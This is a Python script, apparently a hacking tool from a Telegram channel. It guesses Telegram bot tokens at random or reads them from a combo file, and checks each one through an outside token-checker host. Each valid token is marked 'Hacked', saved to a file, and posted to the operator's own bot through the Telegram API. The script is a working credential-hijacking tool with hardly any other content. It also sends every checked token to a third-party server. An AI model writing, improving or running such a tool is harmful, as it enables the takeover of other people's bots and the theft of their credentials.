import requests as r
import os 
import random
R="\033[1;31m"# Red
G="\033[1;32m" # Green
Y="\033[1;37m"# White
author='<\>-------------@OS74O---------------<\>'
TELE='@OS74_TOOLS'
cons=':'
chars='1234567890'
alpha='AAGmdkg6zju32kWgWBIrmAAEcAG8NDzGLgFdTX1IJbQQpuIgrZ9KV4s6CFXAAHvSo0ZJ4H6PeCrm5OP9_DxmimwFcoGgMAfDMs0n32GWcxf8Vrsv78ZXUTvFwZoAAHQxmCEy6P1Nh1bYlzEXIxIdp1X4NlTAAHGorjl70OiaLhSq1eKnmJOISXMNHL56ycAAF6lWCdmIs5bvtlkzl-csAAAF0eOw6A_0p6o8WcEgyikgLJyQHtw4JRygAAEcAG8NDzGLAAHRhB2UMC7FPp7QlLEWLv0g8QGYIDOikC-gFdTX1IJbQQpuIgrZ9KAGmdkg6zju32kWgWBIrmAAEcAG8NDzGLgFdTX1IJbQQpuIgrZ9KV4s6CFXAAHvSo0ZJ4H6PeCrm5OP9_DxmimwFcoGgMAfDMs0n32GWcxf8Vrsv78ZXUTvFwZoAAHQxmCEy6P1Nh1bYlzEXIxIdp1X4NlTAAHGorjl70OiaLhSq1eKnmJOISXMNHL56ycAAF6lWCdmIs5bvtlkzl-csAAAF0eOw6A_0p6o8WcEgyikgLJyQHtw4JRygAAEcAG8NDzGLAAHRhB2UMC7FPp7QlLEWLv0g8QGYIDOikC-gFdTX1IJbQQpuIgrZ9KV4s6CFXAAHvSo0ZJ4H6PeCrm5OP9_DxmimwFcoGgMAfDMs0n32GWcxf8Vrsv78ZXUTvFwZoAAHQxmCEy6P1Nh1bYlzEXIxIdp1X4NlTAAHGorjl70OiaLhSq1eKnmJOISXMNHL56ycAAF6lWCdmIs5bvtlkzlcsAAAF0eOw6V4s6CFXAAHvSo0ZJ4H6PeCrm5OP9_DxmimwFcoGgMAfDMs0n32GWcxf8Vrsv78ZXUTvFwZoAAHQxmCEy6P1NhAGmdkg6zju32kWgWBIrmAAEcAG8NDzGLgFdTX1IJbQQpuIgrZ9KV4s6CFXAAHvSo0ZJ4H6PeCrm5OP9_DxmimwFcoGgMAfDMs0n32GWcxf8Vrsv78ZXUTvFwZoAAHQxmCEy6P1Nh1bYlzEXIxIdp1X4NlTAAHGorjl70OiaLhSq1eKnmJOISXMNHL56ycAAF6lWCdmIs5bvtlkzl-csAAAF0eOw6A_0p6o8WcEgyikgLJyQHtw4JRygAAEcAG8NDzGLAAHRhB2UMC7FPp7QlLEWLv0g8QGYIDOikC-gFdTX1IJbQQpuIgrZ9KV4s6CFXAAHvSo0ZJ4H6PeCrm5OP9_DxmimwFcoGgMAfDMs0n32GWcxf8Vrsv78ZXUTvFwZoAAHQxmCEy6P1Nh1bYlzEXIxIdp1X4NlTAAHGorjl70OiaLhSq1eKnmJOISXMNHL56ycAAF6lWCdmIs5bvtlkzlcsAAAF0eOw61bYlzEXIxIdp1X4NlTAAHGorjl70OiaLhSq1eKnmJOISXMNHL56ycAAF6lWCdmIs5bvtlkzlcsAAAF0eOw6A_0p6o8WcEgyikgLJyQHtw4JRygAAEcAG8NDzGLAAHRhB2UMC7FPp7QlLEWLv0g8QGYIDOikCw'
#<\>----------------------------------------------------<\>#
proxy=True
py2=False
api=True
php=False
os74=True
for_hack=False
While=True
bad=False
for_learn=True
#<\>----------------------------------------------------<\>#
ID=input('YOUR ID : ')
tel=input('YOUR BOT TOKEN : ')
print(f'<\>----------------------<\>\n[1] Random Check •\n[2] Check from combo •\n<\>----------------------<\>')
pass

#<\>----------------------------------------------------<\>#
def random_os74():
	rp=str(''.join(random.choice(alpha) for i in range(35)))
	bot_id=str(''.join(random.choice(chars) for i in range(10)))
	token=bot_id+cons+rp
	req=r.post('https://token-checker.os74.repl.co/?token='+token).text
	print(req)
	if 'is_bot' in req:
		nam=req.split('first_name":"')[1]
		name=nam.split('",')[0]
		use=req.split('username":"')[1]
		user=use.split('",')[0]
		save=f'<\>----------------------<\>\n[✓] Hacked -->\n- Token : {token}\n- username : @{user}\n- Bot_Name : {name}\n<\>----------------------<\> '
		print(G+save)
		open('token-by-@OS74O.txt','a').write(f'{save}')
		r.post(f'https://api.telegram.org/bot{tel}/sendMessage?chat_id={ID}&text={save}\nch:{TELE}').text
		random_os74()
	else:
		print(R+f'[×] BAD TOKEN--> {token} ')
		random_os74()
def random_combo():
	combo='tokens.txt'
	o=open(combo,'r')
	while os74:
		
		line=o.readline().split('\n')[0]
		token=line.split('\n')[0]
		req=r.post('https://token-checker.os74.repl.co/?token='+token).text
		if 'is_bot' in req:
			nam=req.split('first_name":"')[1]
			name=nam.split('",')[0]
			use=req.split('username":"')[1]
			user=use.split('",')[0]
			save=f'<\>----------------------<\>\n[✓] Hacked -->\n- Token : {token}\n- username : @{user}\n- Bot_Name : {name}\n<\>----------------------<\> '
			print(G+save)
			open('token-by-@OS74O.txt','a').write(f'{save}')
			r.post(f'https://api.telegram.org/bot{tel}/sendMessage?chat_id={ID}&text={save}\nch:{TELE}').text
		else:
			print(R+f'[×] BAD TOKEN  --> {token} ')
		


choo=input('\n [✓] Choose: ')

if choo=='1':
	os.system('clear')
	random_os74()
if choo=='2':
	os.system('clear')
	random_combo()
